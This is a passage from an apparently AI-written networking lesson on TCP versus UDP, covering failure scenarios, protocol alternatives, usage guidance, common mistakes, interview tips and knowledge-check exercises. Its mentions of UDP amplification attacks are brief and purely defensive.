- **You must build everything yourself**: sequencing, retransmission, duplicate detection, flow control, and congestion control — and getting congestion control wrong harms other people's traffic.
- **No backpressure**: a fast sender silently drowns a slow receiver.
- **Blocked or rate-limited** by some corporate firewalls and a minority of networks, so you need a TCP fallback path.
- **Amplification attacks**: a spoofed small request producing a large reply makes your server a DDoS weapon. Always keep responses smaller than requests until the peer is validated.
- **Fragmentation is a trap**: exceed the MTU and losing one fragment discards the whole datagram.

**Operational costs**
- TCP: monitor retransmit rates, TIME_WAIT counts, ephemeral port utilisation, accept-queue overflows, and `cwnd` via `ss -tin`.
- UDP: monitor receive-buffer drops (`netstat -su`), and implement your own loss and latency telemetry, because the kernel tracks none of it for you.

## 11. Failure scenarios

| Failure | What the user experiences | How it's detected | How it recovers |
|---|---|---|---|
| Ephemeral port exhaustion (no pooling + TIME_WAIT) | Sudden total failure of outbound calls; `EADDRNOTAVAIL`. CPU, memory, and DB all look **healthy**, so the cause is missed for ages | `ss -s` shows tens of thousands of TIME_WAIT sockets; error logs show "cannot assign requested address" | Enable connection pooling (500× improvement); widen `ip_local_port_range`; set `tcp_tw_reuse=1`; alert on port utilisation |
| Accept queue overflow (app too slow to `accept()`) | Connection timeouts — **not** refusals — so clients wait the full timeout and retry, amplifying load | `netstat -s` shows "SYNs to LISTEN sockets dropped"; `ss -ltn` shows `Recv-Q` at `Send-Q` | Raise `somaxconn`; add worker capacity; shed load with `503` (Lesson 6) |
| Window scaling stripped by a middlebox | Transfers cap at ~2–3 Mbps on a 1 Gbps intercontinental link; everything works, just slowly | Throughput ≈ 64 KB / RTT exactly; `ss -tin` shows a tiny window | Identify and bypass the middlebox; as a workaround, use more parallel connections |
| Tail packet loss triggering an RTO | One request in a hundred takes an extra ~1 second; the average looks fine | **p99 latency** spikes while p50 is unchanged (Lesson 16); `ss -tin` shows `retrans` | Enable SACK and BBR; reduce response size; use HTTP/3 so one loss does not stall other streams |
| HTTP/2 over a lossy link | The whole page stalls at once, repeatedly, and feels worse than the old site | Correlated stalls across all resources; high retransmit counts | Move to HTTP/3 (per-stream recovery), or fall back to multiple HTTP/1.1 connections |
| UDP receive buffer overflow | Silent, invisible data loss — metrics simply go missing with no error anywhere | `netstat -su` shows "packet receive errors"; gaps in metric series | Increase `net.core.rmem_max`; read faster; aggregate locally before sending |
| UDP datagram exceeds MTU and fragments | Intermittent, size-dependent failures: small messages work, large ones never arrive | Loss rate correlated with payload size; `ping -M do -s 1472` fails | Keep payloads under ~1,400 bytes; implement application-level fragmentation |
| Custom UDP protocol with no congestion control | **Other** traffic on the user's link degrades — their video call stutters while your app is fine | User complaints; ISP throttling; packet loss on unrelated flows | Implement congestion control, or adopt QUIC instead of inventing a transport |
| Half-open connection after a peer crash | The client waits forever; the socket looks ESTABLISHED on one side only | No data, no FIN, no RST; `ss` shows ESTABLISHED with a stale timer | Application-level timeouts (always); TCP keepalive as a slow backstop (default 2 hours — far too slow to rely on) |
| Retransmission storm from an aggressive application retry | Latency climbs, then collapses; a self-inflicted outage | Request rate rising while goodput falls — the signature of congestion collapse | Exponential backoff with jitter (Lesson 17); circuit breakers (Phase 4, Topic 14) |
| UDP amplification abuse of an open service | Your bandwidth bill explodes; you are an unwitting participant in a DDoS | Massive egress to addresses that never sent a real request | Rate limit; require request/response size parity until the source is validated; never expose amplifiable services publicly |

## 12. Alternatives

| Protocol | Reliability | Ordering | Connection | Header | Congestion control | Use when |
|---|---|---|---|---|---|---|
| **TCP** | Full | Strict, single stream | Yes, 3-way handshake | 20–60 B | Built in (CUBIC/BBR) | Default for anything where every byte matters |
| **UDP** | None | None | No | 8 B | **None** — you must add it | Timeliness over completeness, or you need to build your own transport |
| **QUIC** | Full, **per stream** | Per stream | Yes, 1-RTT or 0-RTT, over UDP | ~25–50 B | Built in, pluggable, user space | HTTP/3, mobile, lossy links, anything needing connection migration |
| **SCTP** | Configurable | Per stream, optional | Yes, 4-way | 12 B + chunks | Built in | Telecom signalling; blocked by most NATs, so rarely usable on the open internet |
| **DCCP** | None | None | Yes | 12–16 B | **Built in** — congestion control without reliability | Essentially unused; its niche was taken by QUIC |
| **RTP over UDP** | None (app-level FEC) | Sequence numbers for discard | No | 12 B | RTCP feedback loop | Real-time audio and video |
| **WebRTC data channels** | Configurable (SCTP over DTLS over UDP) | Configurable | Yes | Layered | Yes | Browser-to-browser media and data |
| **Unix domain sockets** | Full | Strict | Yes | None | n/a | Two processes on the same host — faster than TCP loopback, no ports, no TIME_WAIT |

The honest summary: for new work in 2026, the real choice is usually **TCP vs QUIC**, not TCP vs raw UDP. Writing a bespoke UDP protocol is justified only when your requirements genuinely differ from QUIC's — overwhelmingly, that means real-time games and media, where you want *selective* reliability and the freedom to discard stale data.

## 13. When to use it

**Use TCP when:**

1. **Every byte must arrive, in order.** HTTP, databases, file transfer, message queues, log shipping, payments. If a missing byte corrupts the result, you need TCP (or QUIC) — do not reimplement this.
2. **You want automatic backpressure.** A slow consumer stalling a fast producer via `rwnd` is a feature; it prevents unbounded buffering and is the transport-layer version of flow control you would otherwise build by hand.
3. **You need to traverse arbitrary networks.** Corporate firewalls, hotel Wi-Fi, and enterprise proxies all pass TCP/443 reliably; UDP is sometimes blocked outright, so any UDP design needs a TCP fallback.
4. **Connections are long-lived and reused.** Database pools, gRPC channels, and internal service meshes amortise the handshake and slow start to near zero, which removes TCP's main disadvantages.

**Use UDP when:**

1. **Late data is worthless data.** Voice, video, live telemetry, game state. Retransmitting a frame that has already missed its playout deadline wastes bandwidth and makes the experience worse, not better.
2. **The exchange is a single tiny request and reply.** DNS, NTP, DHCP. Connection setup would cost more than the data itself.
3. **You need multicast or broadcast.** Service discovery (mDNS), local device announcement, and one-to-many media distribution are impossible over TCP.
4. **You are building a transport.** QUIC-style per-stream delivery, connection migration across networks, or selective reliability — all require control TCP cannot give you, and all require UDP as the substrate.
5. **Loss is acceptable and blocking is not.** Metrics emission from a request path should never block the request; fire-and-forget UDP to a local agent is the standard pattern.

## 14. When *not* to use it

**Do not use TCP when:**

1. **Latency intolerance is absolute.** A 50 ms game loop cannot afford a retransmission that arrives 200 ms late and then forcibly replays stale state due to in-order delivery. In-order delivery is actively harmful here.
2. **The payload is tiny and one-shot and the peer is nearby.** A DNS query over TCP costs a handshake plus teardown plus TIME_WAIT state for 60 bytes of data — roughly 4× the packets for the same information.
3. **You need many short-lived connections to one destination.** The TIME_WAIT ceiling (~470/s per destination) makes this architecturally unsound; either pool, or use a connectionless protocol.

**Do not use UDP when:**

1. **You would end up reimplementing TCP.** If you need reliability, ordering, flow control, and congestion control, you need TCP or QUIC. Hand-rolled versions are slower, buggier, and unfair to other traffic.
2. **You cannot or will not implement congestion control.** A UDP sender without it degrades everyone sharing the path, including the user's own video call. This is not a theoretical concern; it is why some networks throttle unknown UDP.
3. **Your traffic must cross restrictive networks without a fallback.** Some corporate and hotel networks block or heavily rate-limit UDP; QUIC deployments always keep a TCP path for exactly this reason.
4. **The service could be used for amplification.** Any publicly reachable UDP service where responses are larger than requests will eventually be conscripted into a DDoS attack against someone else.

## 15. Common mistakes

**Beginner mistakes**
- Assuming one `send()` equals one `recv()` on TCP. It does not. You must frame messages yourself with a length prefix or a delimiter.
- Using `send()` instead of `sendall()` and ignoring the returned byte count, silently truncating data when the window is full.
- Thinking an ACK means the application processed the data. It means the kernel buffered it.
- Believing UDP is "faster than TCP" in a way that helps a file download. For bulk transfer UDP is not faster; it is just missing features you would have to add back.
- Sending UDP datagrams larger than the MTU and being confused by size-dependent, intermittent failure.
- Forgetting that UDP has no timeout mechanism of its own — without `settimeout`, a lost reply hangs forever.
- Treating a connection timeout and a connection refusal as the same error. Refused means nothing is listening; timeout means dropped packets, a firewall, or an overflowing accept queue.
- Relying on TCP keepalive for liveness detection, not realising the default is **two hours**.

**Experienced-engineer mistakes**
- Creating a new connection per request to an internal service, then being blindsided by `EADDRNOTAVAIL` at exactly 470 requests/second per destination.
- Enabling `tcp_tw_recycle` from an old blog post — it breaks behind NAT and was removed from Linux in 4.12.
- Tuning kernel parameters before fixing the architecture: widening the port range buys 2.3×, pooling buys 500× (§9 Part B).
- Deploying HTTP/2 over a lossy mobile network and making things *worse*, because one lost packet now stalls every multiplexed stream rather than one of six connections.
- Ignoring the bandwidth-delay product on cross-region links and concluding "the network is slow" when the window is the limit.
- Writing a custom UDP protocol with retransmission but **no congestion control**, producing a system that works beautifully in a lab and harms real users' networks.
- Alerting on average latency and never seeing the RTO-driven tail that loss produces (Lesson 16).
- Setting an application timeout shorter than the first RTO (1 second), so every single packet loss on connection setup becomes a user-visible error.
- Not monitoring retransmit rate or `cwnd`, so a degraded link looks identical to an application performance problem.
- Assuming QUIC is "UDP, therefore unreliable" — it is strictly more capable than TCP, and the UDP choice is about deployability, not about dropping guarantees.

## 16. Interview perspective

TCP vs UDP is a classic question, and almost everyone gives the same shallow answer ("TCP is reliable, UDP is fast"). Depth here is cheap signal.

- **Reframe the question.** "The real question is which failure mode the application prefers: late data or missing data. TCP gives you late data; UDP gives you missing data. For checkout, late is fine and missing is fatal. For voice, it is the reverse." This one sentence outperforms a feature list.
- **Separate flow control from congestion control explicitly.** "`rwnd` protects the receiver and is advertised in every ACK; `cwnd` protects the network and is a sender-side guess inferred from loss. The sender is limited by the minimum of the two." Very few candidates get this cleanly.
- **Bring up slow start when discussing page latency.** "A new connection starts at about 14.6 KB in flight, so a 180 KB response takes four round trips regardless of bandwidth. On a reused connection it is one." That converts a vague "connection reuse is good" into arithmetic.
- **Mention TIME_WAIT and ephemeral ports unprompted** when you draw a service calling another service. "At 28,232 ports and a 60-second TIME_WAIT, that is about 470 new connections per second per destination — so we pool." This is a real production failure that interviewers recognise instantly.
- **Explain head-of-line blocking at all three layers** — HTTP/1.1 serialisation, HTTP/2's shared TCP stream, and QUIC's per-stream recovery. It shows you understand *why* HTTP/3 exists rather than just that it does (Lesson 9).
- **Use the bandwidth-delay product to kill a bad proposal.** If someone suggests buying more bandwidth for a slow cross-region replica, compute the BDP and show the window is the limit.
- **Say what QUIC really is.** "QUIC is on UDP not because it wants unreliability, but because TCP is ossified in middleboxes and frozen in kernels. UDP is the blank canvas." That is a senior-level observation.
- **Connect loss to tail latency.** "At 2 % loss, 92 % of a 127-segment response hits at least one loss event, and tail loss means an RTO of up to a second. That is why p99 is 10× p50, not a slow database."

**Red flags interviewers watch for**
- "UDP is faster" with no qualification about what is being measured.
- Not knowing TCP is a stream with no message boundaries.
- Proposing a custom UDP protocol without mentioning congestion control.
- Being unable to explain why a handshake costs a round trip, or how many round trips HTTPS adds.
- Never having heard of head-of-line blocking.
- Thinking more bandwidth fixes a high-RTT transfer.
- Suggesting `tcp_tw_recycle`.
- No awareness that connection reuse eliminates both the handshake and slow start.
- Claiming TCP guarantees delivery to the application (it guarantees delivery to the peer's kernel — the app can still crash, which is why Lesson 17 exists).

## 17. Knowledge check

**Conceptual**

1. A colleague proposes: "Our internal services all talk HTTP over TCP. Let's switch to UDP to cut latency — we control both ends, so we don't need all that TCP overhead." Explain precisely which parts of TCP they would be forced to reimplement, which one of those is the most dangerous to omit and why it harms people outside their system, and under what *specific* measurable conditions their proposal would actually be justified.
2. Explain the difference between flow control and congestion control: what each protects, which side computes it, how each is signalled, and what concretely goes wrong if each is absent. Then explain why a sender is limited by `min(rwnd, cwnd)` rather than by either one alone.
3. Describe head-of-line blocking at the HTTP/1.1 layer, the HTTP/2-over-TCP layer, and the HTTP/3-over-QUIC layer. Explain why HTTP/2 can perform *worse* than six parallel HTTP/1.1 connections on a link with 2 % packet loss, and why this particular problem cannot be fixed by changing TCP.

**Practical scenario**

4. BookNook's `checkout-service` starts returning errors during a flash sale. CPU is 14 %, memory 31 %, the database is idle at 8 % utilisation, and there is plenty of bandwidth. The logs show `cannot assign requested address` on outbound calls to the payment processor. Walk through your diagnosis: what is the mechanism, what single command confirms it within ten seconds, what are the four fixes in order of effectiveness, and roughly what multiplier does each one buy? Then explain why the three metrics everyone checked first (CPU, memory, database) were all guaranteed to look healthy.

**Calculation**

5. BookNook replicates its database from Mumbai to Singapore. The link is **2 Gbps** and the RTT is **65 ms**. The current TCP receive window maximum is set to **512 KiB**. Separately, the `search-service` makes outbound calls to an `index-service` at **1,400 requests/second** to a single IP:port, currently without connection pooling. The ephemeral port range is the Linux default (`32768–60999`) and TIME_WAIT is 60 seconds. MSS is **1,460 bytes** and the initial congestion window is **10 MSS**.
   (a) Compute the bandwidth-delay product for the replication link, and the actual throughput achievable with the current 512 KiB window. What percentage of the link is that, and what window size is required to saturate it?
   (b) How many new connections per second can `search-service` sustain before port exhaustion, and how long after the traffic starts will it fail? What pooling reuse factor (connections reused N times each) would bring port utilisation below 5 %?
   (c) A replicated batch is **3.2 MB**. On a brand-new connection with no loss, how many round trips does slow start need to deliver it, and what is the total wall-clock time including a TCP handshake and a TLS 1.3 handshake?
   (d) If the link develops **1.5 %** packet loss, what is the probability that a single 3.2 MB batch experiences at least one lost segment? Show every step and state every assumption you add.

Reply with your answers and I'll assess them, correct anything shaky, and give model answers before Lesson 9.

---

**Progress checklist**

Phase 1:
- `[x] 1. Client-server architecture`
- `[x] 2. Stateful versus stateless servers`
- `[x] 3. IP addresses, ports, sockets, domain names`
- `[x] 4. DNS resolution and DNS caching`
- `[x] 5. HTTP requests and responses`
- `[x] 6. HTTP methods, headers, cookies, sessions, status codes`
- `[x] 7. HTTPS and TLS`
- `[x] 8. TCP versus UDP`
- `[ ] 9. HTTP/1.1 vs HTTP/2 vs HTTP/3`
- `[ ] 10. REST APIs`
- `[ ] 11. RPC and gRPC`
- `[ ] 12. GraphQL`
- `[ ] 13. Synchronous versus asynchronous communication`
- `[ ] 14. Latency, throughput, bandwidth, concurrency`
- `[ ] 15. Availability, reliability, durability, fault tolerance`
- `[ ] 16. Average latency vs p50/p95/p99, tail latency`
- `[ ] 17. Idempotency, retries, timeouts, exponential backoff`

**NEXT LESSON: Phase 1, Topic 9 — HTTP/1.1 versus HTTP/2 versus HTTP/3**

